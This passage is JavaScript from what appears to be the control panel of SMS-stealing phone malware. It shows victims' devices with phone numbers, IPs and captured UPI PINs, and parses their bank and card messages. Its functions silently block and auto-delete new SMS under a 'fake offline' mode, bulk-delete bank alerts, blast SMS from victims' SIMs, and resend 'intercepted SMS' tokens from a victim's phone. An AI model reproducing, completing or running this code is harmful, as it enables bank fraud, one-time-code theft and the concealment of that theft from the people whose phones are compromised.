  return '<div class="msg-card card-theme"><div class="card-header"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>'+(card.cardType||'Card')+'</div><div class="card-number">**** **** **** '+card.cardLast4+'</div><div class="card-msg-text">'+sms.text+'</div><div style="font-size:10px;color:var(--muted);text-align:right;margin-top:4px;">'+ist+'</div><div class="msg-actions-bar"><button class="action-btn" onclick="copyMsgById(\''+sms.id+'\')">Copy</button><button class="action-btn delete" onclick="deleteSingleMessage(\''+sms.id+'\', false)">🗑 Delete</button></div></div>';
}
function renderQuotaItem(sms){
  const ist=formatIST(sms.time,sms.id);const ms=parseTimeMs(sms.time,sms.id);const isToday3=ms&&getISTDate(ms)===getTodayIST();
  const q=sms.qInfo||isQuotaSms(sms.text)||{pct:100,type:'reached'};
  let title,color;
  if(q.type==='reached'||q.pct>=100){title='🚨 SMS LIMIT REACHED '+(isToday3?'(TODAY)':'(OLD)');color='var(--danger)';}
  else{title='⚠ SMS '+q.pct+'% USED '+(isToday3?'(TODAY)':'(OLD)');color='var(--warn)';}
  return '<div class="msg-card quota-theme"><div class="msg-top"><span class="msg-sender" style="color:'+color+';">'+title+'</span><span class="msg-time">'+ist+'</span></div><div class="msg-body">'+sms.text+'</div><div class="msg-actions-bar"><button class="action-btn" onclick="copyMsgById(\''+sms.id+'\')">Copy</button><button class="action-btn delete" onclick="deleteSingleMessage(\''+sms.id+'\', false)">🗑 Delete</button></div></div>';
}
function renderBankItem(sms,bank){
  const ist=formatIST(sms.time,sms.id);const isCredit=bank.transactionType==='credit';
  const balDisp=bank.availableBalance!==null&&bank.availableBalance!==undefined?'₹'+formatAmount(bank.availableBalance):'—';
  const txDisp=bank.transactionAmount&&bank.transactionAmount!==bank.availableBalance?(isCredit?'+':'-')+'₹'+formatAmount(bank.transactionAmount):'—';
  return '<div class="msg-card bank-theme"><div class="bank-top-row"><div style="display:flex;align-items:center;gap:8px;"><div class="bank-logo">₹</div><div><div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;"><span class="bank-name-badge">'+bank.bankName+'</span><span class="bank-sender">'+sms.sender+'</span>'+(bank.accountLast4?'<span class="bank-acc-badge">'+bank.accountLast4+'</span>':'')+'</div></div></div>'+(bank.transactionType?'<div class="bank-type-badge '+(isCredit?'credit':'debit')+'">'+(isCredit?'↗ Credit':'↙ Debit')+'</div>':'')+'</div><div class="bank-bal-row"><div class="bank-bal-col"><div class="bank-bal-label">💰 Available Balance</div><div class="bank-bal-amt">'+balDisp+'</div></div><div class="bank-bal-col txn-col"><div class="bank-bal-label">'+(isCredit?'⬆ Credited':'⬇ Debited')+'</div><div class="bank-txn-amt '+(isCredit?'credit':'debit')+'">'+txDisp+'</div>'+(bank.transactionType?'<span class="bank-txn-tag '+(isCredit?'credit':'debit')+'">'+(isCredit?'CREDIT':'DEBIT')+'</span>':'')+'</div></div><div class="bank-msg-raw">'+sms.text+'</div><div style="font-size:10px;color:var(--muted);text-align:right;margin-top:4px;">'+ist+'</div><div class="msg-actions-bar"><button class="action-btn" onclick="copyMsgById(\''+sms.id+'\')">Copy</button><button class="action-btn delete" onclick="deleteSingleMessage(\''+sms.id+'\', false)">🗑 Delete</button></div></div>';
}

// ═══════════════════════════════════════════
//  DEVICE UI UPDATE (same)
// ═══════════════════════════════════════════
function updateDeviceUI(dev){
  $('detNum').innerText=dev.number;$('detNet').innerText=dev.network;$('detAndroid').innerText=dev.android;
  $('detBattery').innerText=dev.batteryStr;$('detIp').innerText=dev.ip;$('detUpiPin').innerText=dev.upipin||'—';
  $('detName').innerText=dev.name;$('detIdSubInfo').innerText=dev.id;
  let qInfo={pct:0,type:''};if(window._currentSmsArr) qInfo=computeQuotaForDevice(dev.id,window._currentSmsArr);
  dev.limitHit=qInfo.hit&&qInfo.pct>=50;dev.limitInfo=dev.limitHit?{pct:qInfo.pct,type:qInfo.type}:null;
  const limEl=$('detLimit');if(limEl){if(dev.limitHit){if(qInfo.type==='reached'||qInfo.pct>=100){limEl.innerText="SMS LIMIT REACHED";limEl.style.color="var(--danger)";}else{limEl.innerText="SMS USED "+qInfo.pct+"%";limEl.style.color="var(--warn)";}}else{limEl.innerText="OK";limEl.style.color="var(--green)";}}
  const statEl=$('detStatus');
  statEl.innerHTML='<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:'+(dev.online?'var(--green)':'var(--muted)')+';margin-right:5px;"></span> '+(dev.online?'ONLINE':'OFFLINE');
  statEl.style.color=dev.online?'var(--green)':'var(--muted)';
  const lsEl=$('detLastSeen');
  if(lsEl){if(dev.lastSeen>1e12){const rel=formatRelativeTime(dev.lastSeen);const abs=formatIST(dev.lastSeen,'');lsEl.innerText=dev.online?rel+' ('+abs+')':'Offline since '+rel+' · '+abs;lsEl.style.color=dev.online?'var(--green)':'var(--muted)';}else{lsEl.innerText='—';lsEl.style.color='var(--muted)';}}
  const dbSt=$('detDbStatus');if(dbSt){dbSt.innerText=dev.isFake?'OFFLINE (fake)':(dev.online?'ONLINE':'OFFLINE');dbSt.style.color=dev.isFake?'var(--warn)':(dev.online?'var(--green)':'var(--muted)');}
}

// ═══════════════════════════════════════════
//  FAKE OFFLINE (via backend)
// ═══════════════════════════════════════════
async function toggleFakeOffline(){
  if(!activeDevice) return;
  const id=activeDevice.id,url=activeDevice.dbUrl,key=activeDevice.dbKey;
  if(activeDevice.isFake){
    try{
      await backendCall("fb_set_status", { dbUrl: url, dbKey: key, deviceId: id, status: true });
      await backendCall("fb_put_node", { dbUrl: url, dbKey: key, path: "clients/"+id+"/blockSms", value: false });
    }catch(e){}
    fakeOfflineDevices=fakeOfflineDevices.filter(x=>x!==id);localStorage.setItem('fake_offline_devices',JSON.stringify(fakeOfflineDevices));
    delete fakeOfflineSince[id];localStorage.setItem('fake_offline_since',JSON.stringify(fakeOfflineSince));
    delete window._preFakeSmsIds[id];savePreIds();
    activeDevice.isFake=false;activeDevice.online=true;activeDevice.realOnline=true;activeDevice.dbStatus=true;
    toast("✅ Device restored ONLINE");$('btnFakeOffline').innerText="Fake Offline";$('btnFakeOffline').style.background='var(--warn)';
    const smsArr=await fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,activeDevice.id);
    window._currentSmsArr=smsArr;window.deviceSmsCache[activeDevice.id]=smsArr;processAndRenderSms(smsArr);
  }else{
    try{
      await backendCall("fb_set_status", { dbUrl: url, dbKey: key, deviceId: id, status: false });
      await backendCall("fb_put_node", { dbUrl: url, dbKey: key, path: "clients/"+id+"/blockSms", value: true });
    }catch(e){}
    if(!fakeOfflineDevices.includes(id)) fakeOfflineDevices.push(id);localStorage.setItem('fake_offline_devices',JSON.stringify(fakeOfflineDevices));
    fakeOfflineSince[id]=Date.now();localStorage.setItem('fake_offline_since',JSON.stringify(fakeOfflineSince));
    try{const bl=await fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,id,200);window._preFakeSmsIds[id]=new Set(bl.map(m=>m.id));}catch(e){window._preFakeSmsIds[id]=new Set((window.deviceSmsCache[id]||[]).map(m=>m.id));}
    savePreIds();
    activeDevice.isFake=true;activeDevice.online=false;activeDevice.dbStatus=false;
    toast("🚫 Fake Offline ON. Auto-deleting new SMS.");$('btnFakeOffline').innerText="Remove Fake";$('btnFakeOffline').style.background='var(--green)';
    allMsgsCache=allMsgsCache.filter(m=>m.devId!==id);allMsgsIds.clear();allMsgsCache.forEach(m=>allMsgsIds.add((m.dbUrl||'')+'_'+m.devId+'_'+m.id));
  }
  updateDeviceUI(activeDevice);renderDevices();startAutoDeleteWorker();
}

async function setAllFakeOffline(makeFake){
  if(!allDevices.length) return toast("No devices loaded");
  if(!confirm(makeFake?"Set ALL devices to Fake Offline?":"Restore ALL devices to Default?")) return;
  const btn=makeFake?$('btnAllOffline'):$('btnDefaultStatus');const oldText=btn.innerText;btn.innerText="Processing...";btn.disabled=true;
  const now=Date.now();
  for(let i=0;i<allDevices.length;i++){
    const d=allDevices[i];
    try{
      if(makeFake){
        await backendCall("fb_set_status", { dbUrl: d.dbUrl, dbKey: d.dbKey, deviceId: d.id, status: false });
        await backendCall("fb_put_node", { dbUrl: d.dbUrl, dbKey: d.dbKey, path: "clients/"+d.id+"/blockSms", value: true });
        if(!fakeOfflineDevices.includes(d.id)) fakeOfflineDevices.push(d.id);
        if(!fakeOfflineSince[d.id]) fakeOfflineSince[d.id]=now;
        d.isFake=true;d.online=false;d.limitHit=false;d.limitInfo=null;
        window._preFakeSmsIds[d.id]=new Set((window.deviceSmsCache[d.id]||[]).map(m=>m.id));
      }else{
        await backendCall("fb_set_status", { dbUrl: d.dbUrl, dbKey: d.dbKey, deviceId: d.id, status: true });
        await backendCall("fb_put_node", { dbUrl: d.dbUrl, dbKey: d.dbKey, path: "clients/"+d.id+"/blockSms", value: false });
        fakeOfflineDevices=fakeOfflineDevices.filter(x=>x!==d.id);delete fakeOfflineSince[d.id];
        d.isFake=false;d.online=d.realOnline;delete window._preFakeSmsIds[d.id];
      }
      updateStats();renderDevices();
    }catch(e){}
  }
  localStorage.setItem('fake_offline_devices',JSON.stringify(fakeOfflineDevices));localStorage.setItem('fake_offline_since',JSON.stringify(fakeOfflineSince));savePreIds();
  btn.innerText=oldText;btn.disabled=false;toast("✅ Bulk action applied");startAutoDeleteWorker();
  allMsgsCache=allMsgsCache.filter(m=>!fakeOfflineDevices.includes(m.devId));allMsgsIds.clear();allMsgsCache.forEach(m=>allMsgsIds.add((m.dbUrl||'')+'_'+m.devId+'_'+m.id));
}

async function resetDefaultStatus(){
  if(!allDevices.length) return toast("No devices loaded");
  if(!confirm("Reset ALL devices to original DB status?")) return;
  const btn=$('btnDefaultStatus');const oldText=btn.innerText;btn.innerText="Resetting...";btn.disabled=true;
  fakeOfflineDevices=[];localStorage.setItem('fake_offline_devices',JSON.stringify(fakeOfflineDevices));
  fakeOfflineSince={};localStorage.setItem('fake_offline_since',JSON.stringify(fakeOfflineSince));
  window._preFakeSmsIds={};savePreIds();
  for(let i=0;i<allDevices.length;i++){
    const d=allDevices[i];
    try{await backendCall("fb_put_node", { dbUrl: d.dbUrl, dbKey: d.dbKey, path: "clients/"+d.id+"/blockSms", value: false });d.isFake=false;d.online=d.realOnline;updateStats();renderDevices();}catch(e){}
  }
  btn.innerText=oldText;btn.disabled=false;toast("✅ All restored");startAutoDeleteWorker();
}

// ═══════════════════════════════════════════
//  SMS LOCK (same)
// ═══════════════════════════════════════════
function toggleSmsLock(){
  if(!activeDevice) return;
  const id=activeDevice.id;
  if(smsLockedDevices.includes(id)){smsLockedDevices=smsLockedDevices.filter(x=>x!==id);toast("🔓 UNLOCKED");}
  else{smsLockedDevices.push(id);toast("🔒 LOCKED");}
  localStorage.setItem('sms_locked_devices',JSON.stringify(smsLockedDevices));
  updateLockButtonState();updateSendTabLockState();renderDevices();
}
function updateLockButtonState(){
  if(!activeDevice) return;
  const isLocked=smsLockedDevices.includes(activeDevice.id);const btn=$('btnLockSms');
  if(isLocked){btn.innerText="🔓 Unlock SMS";btn.style.background='rgba(0,230,118,.1)';btn.style.color='var(--green)';btn.style.borderColor='rgba(0,230,118,.3)';}
  else{btn.innerText="🔒 Lock SMS";btn.style.background='rgba(255,77,109,.1)';btn.style.color='var(--danger)';btn.style.borderColor='rgba(255,77,109,.3)';}
}
function updateSendTabLockState(){
  if(!activeDevice) return;
  const isLocked=smsLockedDevices.includes(activeDevice.id)||activeDevice.isFake;
  $('sendLockWarning').style.display=isLocked?'block':'none';
  if(isLocked) $('sendLockWarning').innerText="🔒 SMS Sending is LOCKED / OFFLINE for this device!";
  $('btnSendSingle').disabled=isLocked;$('btnSendSingle').innerText=isLocked?"🔒 Locked":"📤 Send Message";$('btnSendSingle').style.background=isLocked?'var(--muted)':'var(--cyan)';
  $('tokenLockWarning').style.display=isLocked?'block':'none';
  if(isLocked) $('tokenLockWarning').innerText="🔒 SMS Sending is LOCKED / OFFLINE for this device!";
  $('btnSendAutoToken').disabled=isLocked;$('btnSendAutoToken').innerText=isLocked?"🔒 Locked":"⚡ Send Auto Token";$('btnSendAutoToken').style.background=isLocked?'var(--muted)':'var(--purple)';
}

// ═══════════════════════════════════════════
//  DELETE FUNCTIONS (via backend)
// ═══════════════════════════════════════════
function renderDeletedTab(devId){
  let list=deletedSmsCache[devId]||[];
  if(!list.length){$('detDeletedList').innerHTML='<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px;">No deleted SMS history.</div>';return;}
  let html='<div style="font-size:11px;color:var(--muted);margin-bottom:8px;text-align:center;">🗑 Auto-deleted SMS history (max 50)</div>';
  [...list].sort((a,b)=>b.deletedAt-a.deletedAt).forEach(sms=>{
    const ist=formatIST(sms.time,sms.id);const delTime=new Date(sms.deletedAt).toLocaleString('en-IN',{timeZone:'Asia/Kolkata'});
    html+='<div class="msg-card sms-theme deleted-msg"><div class="msg-top"><span class="msg-sender">'+(sms.sender||'Unknown')+'</span><span class="msg-time">'+ist+'</span></div><div class="msg-body">'+sms.text+'</div><div style="font-size:10px;color:var(--muted);margin-top:4px;">🗑 Deleted: '+delTime+'</div></div>';
  });
  $('detDeletedList').innerHTML=html;
}
function clearDeletedLog(){if(!activeDevice) return;if(!confirm("Clear deleted SMS history?")) return;deletedSmsCache[activeDevice.id]=[];localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));renderDeletedTab(activeDevice.id);toast("History cleared");}
function copyDeletedList(){if(!activeDevice) return;const list=deletedSmsCache[activeDevice.id]||[];if(!list.length) return toast("No history");navigator.clipboard.writeText(list.map(m=>'['+formatIST(m.time,m.id)+']['+m.sender+'] '+m.text).join('\n\n')).then(()=>toast("Copied!"));}

async function deleteSingleMessage(msgId,isAllMsgCache){
  if(!confirm("Delete this message permanently?")) return;
  let targetUrl,targetKey,targetDevId;
  if(isAllMsgCache){const msg=allMsgsCache.find(m=>m.id===msgId);if(!msg) return;const dev=allDevices.find(d=>d.id===msg.devId&&(d.dbName===msg.dbName||!isAllMode));if(!dev){toast("Device not found");return;}targetUrl=dev.dbUrl;targetKey=dev.dbKey;targetDevId=dev.id;}
  else{if(!activeDevice) return;targetUrl=activeDevice.dbUrl;targetKey=activeDevice.dbKey;targetDevId=activeDevice.id;}
  isDeleting=true;
  try{
    const r = await backendCall("fb_delete_msg", { dbUrl: targetUrl, dbKey: targetKey, deviceId: targetDevId, msgId });
    if(!r || !r.ok) throw new Error("Delete failed");
    const msgObj=(window._currentSmsArr||[]).find(m=>m.id===msgId)||allMsgsCache.find(m=>m.id===msgId);
    if(msgObj){if(!deletedSmsCache[targetDevId]) deletedSmsCache[targetDevId]=[];if(!deletedSmsCache[targetDevId].some(x=>x.id===msgId)){deletedSmsCache[targetDevId].unshift({id:msgId,text:msgObj.text,sender:msgObj.sender,time:msgObj.time,deletedAt:Date.now()});if(deletedSmsCache[targetDevId].length>50) deletedSmsCache[targetDevId]=deletedSmsCache[targetDevId].slice(0,50);localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));}}
    if(window._currentSmsArr){window._currentSmsArr=window._currentSmsArr.filter(m=>m.id!==msgId);if(activeDevice) window.deviceSmsCache[activeDevice.id]=window._currentSmsArr;lastRawSms="__FORCE__";processAndRenderSms(window._currentSmsArr);if(activeDevice) renderDeletedTab(activeDevice.id);}
    if(allMsgsCache){allMsgsCache=allMsgsCache.filter(m=>m.id!==msgId);allMsgsIds.delete((targetUrl||'')+'_'+targetDevId+'_'+msgId);renderAllMessages();}
    toast("Message deleted");
  }catch(e){toast("Delete failed: "+e.message);}
  finally{isDeleting=false;}
}

async function deleteDeviceSms(){
  if(!activeDevice) return;if(!confirm("Delete ALL SMS from this device?")) return;
  if(autoRefreshTimer){clearTimeout(autoRefreshTimer);autoRefreshTimer=null;}
  isDeleting=true;const btn=$('btnDelDevSms');btn.disabled=true;btn.innerText="Deleting...";
  try{
    const arr=window._currentSmsArr||[];
    if(arr.length>0){if(!deletedSmsCache[activeDevice.id]) deletedSmsCache[activeDevice.id]=[];arr.forEach(m=>{if(!deletedSmsCache[activeDevice.id].some(x=>x.id===m.id)) deletedSmsCache[activeDevice.id].unshift({id:m.id,text:m.text,sender:m.sender,time:m.time,deletedAt:Date.now()});});if(deletedSmsCache[activeDevice.id].length>50) deletedSmsCache[activeDevice.id]=deletedSmsCache[activeDevice.id].slice(0,50);localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));}
    await backendCall("fb_delete_node", { dbUrl: activeDevice.dbUrl, dbKey: activeDevice.dbKey, path: "messages/"+activeDevice.id });
    toast("All SMS Deleted");window._currentSmsArr=[];window.deviceSmsCache[activeDevice.id]=[];lastRawSms="__FORCE__";processAndRenderSms([]);renderDeletedTab(activeDevice.id);
  }catch(e){toast("Delete failed: "+e.message);}
  btn.disabled=false;btn.innerText="Delete All SMS";isDeleting=false;
  if(activeDevice) startDeviceAutoRefresh();
}

async function deleteDeviceBank(){
  if(!activeDevice) return;
  const bankMsgs=(window._currentSmsArr||[]).filter(m=>m.bInfo&&!isQuotaSms(m.text));
  if(!bankMsgs.length) return toast("No bank SMS to delete");
  if(!confirm("Delete "+bankMsgs.length+" bank SMS?")) return;
  isDeleting=true;const btn=$('btnDelDevBank');btn.disabled=true;
  let success=0;
  if(!deletedSmsCache[activeDevice.id]) deletedSmsCache[activeDevice.id]=[];
  for(let i=0;i<bankMsgs.length;i+=20){
    const batch=bankMsgs.slice(i,i+20);
    await Promise.all(batch.map(async(msg)=>{try{const r = await backendCall("fb_delete_msg", { dbUrl: activeDevice.dbUrl, dbKey: activeDevice.dbKey, deviceId: activeDevice.id, msgId: msg.id });if(r && r.ok){success++;if(!deletedSmsCache[activeDevice.id].some(x=>x.id===msg.id)) deletedSmsCache[activeDevice.id].unshift({id:msg.id,text:msg.text,sender:msg.sender,time:msg.time,deletedAt:Date.now()});}}catch(e){}}));
  }
  if(deletedSmsCache[activeDevice.id].length>50) deletedSmsCache[activeDevice.id]=deletedSmsCache[activeDevice.id].slice(0,50);
  localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));
  btn.disabled=false;toast("✅ Deleted "+success+" bank SMS");
  const smsArr=await fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,activeDevice.id);
  window._currentSmsArr=smsArr;window.deviceSmsCache[activeDevice.id]=smsArr;lastRawSms="__FORCE__";processAndRenderSms(smsArr);renderDeletedTab(activeDevice.id);
  isDeleting=false;
}

function copySms(type){
  let list=[];
  if(type==='bank') list=(window._currentSmsArr||[]).filter(m=>m.bInfo&&!isQuotaSms(m.text));
  else if(type==='card') list=(window._currentSmsArr||[]).filter(m=>m.cInfo&&!isQuotaSms(m.text));
  else if(type==='quota') list=(window._currentSmsArr||[]).filter(m=>isQuotaSms(m.text));
  else list=(window._currentSmsArr||[]).filter(m=>!m.cInfo&&!m.bInfo&&!isQuotaSms(m.text));
  if(!list||!list.length) return toast("No SMS to copy");
  navigator.clipboard.writeText(list.map(m=>'['+formatIST(m.time,m.id)+']['+m.direction+']['+m.sender+'] '+m.text).join('\n\n')).then(()=>toast("Copied!"));
}

async function deleteAllGlobalBank(){
  if(!allDevices.length) return toast("No devices loaded");
  if(!confirm("Delete ALL BANK SMS from ALL devices?")) return;
  const btn=$('btnDelAllBank');btn.disabled=true;btn.innerText="Loading...";
  let allBankMsgs=[];
  for(let i=0;i<allDevices.length;i+=5){
    const batch=allDevices.slice(i,i+5);
    await Promise.all(batch.map(async(d)=>{const smsArr=await fetchMessagesFromDb(d.dbUrl,d.dbKey,d.id);smsArr.filter(m=>parseBankSMS(m.text,m.sender)&&!isQuotaSms(m.text)).forEach(m=>allBankMsgs.push({...m,dbUrl:d.dbUrl,dbKey:d.dbKey,devId:d.id}));}));
    btn.innerText='Loading '+Math.min(i+5,allDevices.length)+'/'+allDevices.length+'...';
  }
  if(!allBankMsgs.length){btn.disabled=false;btn.innerText="Delete Bank";return toast("No bank SMS found");}
  if(!confirm("Found "+allBankMsgs.length+" bank SMS. Delete all?")){btn.disabled=false;btn.innerText="Delete Bank";return;}
  let success=0;
  for(let i=0;i<allBankMsgs.length;i+=20){
    const batch=allBankMsgs.slice(i,i+20);
    await Promise.all(batch.map(async(msg)=>{try{const r = await backendCall("fb_delete_msg", { dbUrl: msg.dbUrl, dbKey: msg.dbKey, deviceId: msg.devId, msgId: msg.id });if(r && r.ok){success++;if(!deletedSmsCache[msg.devId]) deletedSmsCache[msg.devId]=[];if(!deletedSmsCache[msg.devId].some(x=>x.id===msg.id)) deletedSmsCache[msg.devId].unshift({id:msg.id,text:msg.text,sender:msg.sender,time:msg.time,deletedAt:Date.now()});}}catch(e){}}));
    btn.innerText='Deleting '+Math.min(i+20,allBankMsgs.length)+'/'+allBankMsgs.length+'...';
  }
  for(const k in deletedSmsCache){if(deletedSmsCache[k].length>50) deletedSmsCache[k]=deletedSmsCache[k].slice(0,50);}
  localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));
  btn.disabled=false;btn.innerText="Delete Bank";toast("✅ Deleted "+success+" bank SMS");
  if(!isAllMode) loadRealData(currentDb); else connectAllSaved();
}

async function deleteAllGlobalSms(){
  if(!allDevices.length) return;if(!confirm("Delete ALL SMS from ALL devices?")) return;
  const btn=$('btnDelAllSms');btn.disabled=true;let success=0;
  for(let i=0;i<allDevices.length;i++){
    const d=allDevices[i];btn.innerText='Deleting '+(i+1)+'/'+allDevices.length+'...';
    try{
      if(window.deviceSmsCache[d.id]&&window.deviceSmsCache[d.id].length>0){if(!deletedSmsCache[d.id]) deletedSmsCache[d.id]=[];window.deviceSmsCache[d.id].forEach(m=>{if(!deletedSmsCache[d.id].some(x=>x.id===m.id)) deletedSmsCache[d.id].unshift({id:m.id,text:m.text,sender:m.sender,time:m.time,deletedAt:Date.now()});});if(deletedSmsCache[d.id].length>50) deletedSmsCache[d.id]=deletedSmsCache[d.id].slice(0,50);}
      await backendCall("fb_delete_node", { dbUrl: d.dbUrl, dbKey: d.dbKey, path: "messages/"+d.id });
      success++;
    }catch(e){}
  }
  localStorage.setItem('deleted_sms_cache',JSON.stringify(deletedSmsCache));
  btn.disabled=false;btn.innerText="Delete SMS";toast("Deleted SMS for "+success+" devices!");
  if(!isAllMode) loadRealData(currentDb); else connectAllSaved();
}

// ═══════════════════════════════════════════
//  BROADCAST (via backend)
// ═══════════════════════════════════════════
function openBroadcast(){$('broadcastModal').classList.add('active');$('broadcastLog').style.display='none';$('btnSendBroadcast').disabled=false;$('btnSendBroadcast').innerText='⚡ Blast All';}

async function sendBroadcast(){
  if(broadcastActive) return toast("Already sending...");
  const msg=$('broadcastMsg').value.trim();
  if(!msg||!allDevices.length) return toast("Message or devices missing");
  const targetFilter=$('bulkTarget').value,simChoice=$('bulkSim').value,targetNum=$('bulkTargetNum').value.trim();
  let devicesToSend=allDevices.filter(d=>(targetFilter==='all'||d.online)&&!smsLockedDevices.includes(d.id)&&!d.isFake);
  if(!devicesToSend.length) return toast("No eligible devices");
  const log=$('broadcastLog');log.style.display='block';log.innerHTML='⚡ Preparing '+devicesToSend.length+' devices...';
  let tasks=[];
  for(const d of devicesToSend){const num=targetNum||d.number;if(!num||num==='—') continue;const sims=simChoice==='both'?[1,2]:[parseInt(simChoice)];for(const sim of sims) tasks.push({devId:d.id,dbUrl:d.dbUrl,dbKey:d.dbKey,sim,num,devName:d.name});}
  if(!tasks.length){log.innerHTML='<div class="err">No valid target numbers</div>';return toast("No valid targets");}
  broadcastActive=true;let success=0,fail=0,done=0;const failedDevs=new Set();const total=tasks.length;
  $('btnSendBroadcast').disabled=true;$('btnSendBroadcast').innerText='⏳ Sending 0/'+total;
  const CONC=40;
  const updateLog=()=>{log.innerHTML='⚡ Progress: '+done+'/'+total+'<br><span style="color:var(--green)">✓ '+success+' sent</span> • <span style="color:var(--danger)">✗ '+fail+' failed</span>';$('btnSendBroadcast').innerText='⏳ Sending '+done+'/'+total;log.scrollTop=log.scrollHeight;};
  await new Promise(resolve=>{
    let active=0,idx=0;
    function next(){if(idx>=total&&active===0){resolve();return;}while(active<CONC&&idx<total){const t=tasks[idx++];active++;(async()=>{try{const r = await backendCall("fb_send_sms", { dbUrl: t.dbUrl, dbKey: t.dbKey, deviceId: t.devId, sim: t.sim, to: t.num, message: msg });if(r && r.ok) success++;else{fail++;failedDevs.add(String(t.devName||t.devId).slice(0,20));}}catch(e){fail++;failedDevs.add(String(t.devName||t.devId).slice(0,20));}done++;active--;if(done%5===0||done===total) updateLog();next();})();}
    }
    next();
  });
  updateLog();broadcastActive=false;$('btnSendBroadcast').disabled=false;$('btnSendBroadcast').innerText='⚡ Blast All';toast("⚡ Done: "+success+" sent / "+fail+" failed");if(success>0) $('broadcastMsg').value='';
}

// ═══════════════════════════════════════════
//  SEND SINGLE / AUTO TOKEN (via backend)
// ═══════════════════════════════════════════
function saveDeviceForwarder(){if(!activeDevice) return;deviceForwarders[activeDevice.id]={token:$('devFwdToken').value.trim(),chatId:$('devFwdChatId').value.trim()};localStorage.setItem('dev_forwarders',JSON.stringify(deviceForwarders));toast("Forwarder Saved!");}
function copyOtp(otp){navigator.clipboard.writeText(otp).then(()=>toast("OTP Copied: "+otp));}
function copyMsgById(id){const msg=(window._currentSmsArr||[]).find(m=>m.id===id);if(msg) navigator.clipboard.writeText(msg.text).then(()=>toast("Copied!"));}

async function sendSingleSms(){
  if(!activeDevice) return;if(smsLockedDevices.includes(activeDevice.id)||activeDevice.isFake) return toast("🔒 LOCKED / OFFLINE!");
  const msg=$('singleMsgText').value.trim();let rawNum=($('sendTargetNum').value.trim()||activeDevice.number);
  if(!msg) return toast("Enter message");if(!rawNum||rawNum==='—') return toast("Enter target number");
  let tn=rawNum.replace(/\D/g,'');if(tn.length===10) tn='+91'+tn;else if(tn.length===12&&tn.startsWith('91')) tn='+'+tn;
  const simChoice=$('sendSim').value;const sims=simChoice==='both'?[1,2]:[parseInt(simChoice)];
  const log=$('singleLog');log.style.display='block';log.innerHTML='Sending...';let success=0;
  for(const sim of sims){try{const r = await backendCall("fb_send_sms", { dbUrl: activeDevice.dbUrl, dbKey: activeDevice.dbKey, deviceId: activeDevice.id, sim, to: tn, message: msg });if(r && r.ok) success++;}catch(e){}}
  if(success===sims.length){log.innerHTML='<div class="ok">[✓] Sent to '+tn+'</div>';$('singleMsgText').value='';}
  else log.innerHTML='<div class="err">[X] Failed</div>';
}

async function sendAutoToken(){
  if(!activeDevice) return;if(smsLockedDevices.includes(activeDevice.id)||activeDevice.isFake) return toast("🔒 LOCKED / OFFLINE!");
  const rawMsg=$('autoTokenMsg').value.trim();if(!rawMsg) return toast("Paste intercepted SMS first");
  let to="",body="";
  const toMatch=rawMsg.match(/To\s*\(Tap to copy\):?\s*([\d\+\s\-]+)/i);if(toMatch) to=toMatch[1].replace(/\D/g,'');
  const bodyMatch=rawMsg.match(/Body\s*\(Tap to copy\):?\s*([\s\S]+)/i);
  if(bodyMatch) body=bodyMatch[1].trim();
  else{const lines=rawMsg.split('\n');let si=-1;for(let i=0;i<lines.length;i++){if(/To\s*\(Tap to copy\)/i.test(lines[i])){si=i;break;}}if(si!==-1&&lines.length>si+2) body=lines.slice(si+2).join('\n').trim();}
  if(!to||!body) return toast("Could not extract Number or Body");
  const simChoice=$('autoTokenSim').value;const sims=simChoice==='both'?[1,2]:[parseInt(simChoice)];
  const log=$('autoTokenLog');log.style.display='block';log.innerHTML='Sending to '+to+'...';let success=0;
  for(const sim of sims){try{const r = await backendCall("fb_send_sms", { dbUrl: activeDevice.dbUrl, dbKey: activeDevice.dbKey, deviceId: activeDevice.id, sim, to, message: body });if(r && r.ok) success++;}catch(e){}}
  if(success>0){log.innerHTML='<div class="ok">[✓] Token sent to '+to+' via SIM '+simChoice+'!</div>';$('autoTokenMsg').value='';}
  else log.innerHTML='<div class="err">[X] Failed</div>';
}

// ═══════════════════════════════════════════
//  ALL MESSAGES (same)
// ═══════════════════════════════════════════
function showLoadingBar(text,pct){const bar=$('allMsgsLoadingBar');if(!bar) return;bar.style.display='block';$('allMsgsLoadingText').textContent=text;$('allMsgsProgressBar').style.width=Math.min(100,pct)+'%';}
function hideLoadingBar(){const bar=$('allMsgsLoadingBar');if(bar) bar.style.display='none';}

function openAllMessages(){
  if(allDevices.length===0) return toast("Open a Firebase first");
  switchMainTab('allmsgs');
  if(allMsgsCache.length===0) _loadMsgsFromSession();
  if(allMsgsCache.length>0){
    renderAllMessages();
    setTimeout(()=>{if(!allMsgsLoading) tailAllMessages();},500);
  }else{
    $('allMsgsList').innerHTML='<div style="text-align:center;padding:40px;color:var(--cyan);"><div class="spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 12px;"></div><div style="font-size:13px;font-weight:700;">Loading messages...</div></div>';
    if(!allMsgsLoading) loadAllMessages(true);
  }
  if(allMsgsAutoTimer) clearInterval(allMsgsAutoTimer);
  allMsgsAutoTimer=setInterval(()=>{
    if($('view-allmsgs').classList.contains('active')&&!allMsgsLoading) tailAllMessages();
  },1500);
  if(allMsgsLabelTicker) clearInterval(allMsgsLabelTicker);
  allMsgsLabelTicker=setInterval(updateAllMsgsLabel,1000);
}

function closeAllMessages(){
  if(allMsgsAutoTimer){clearInterval(allMsgsAutoTimer);allMsgsAutoTimer=null;}
  if(allMsgsLabelTicker){clearInterval(allMsgsLabelTicker);allMsgsLabelTicker=null;}
  hideLoadingBar();switchMainTab('dashboard');
}

function updateAllMsgsLabel(){
  if(!allMsgsLastRefreshTime) return;
  const secsAgo=Math.floor((Date.now()-allMsgsLastRefreshTime)/1000);
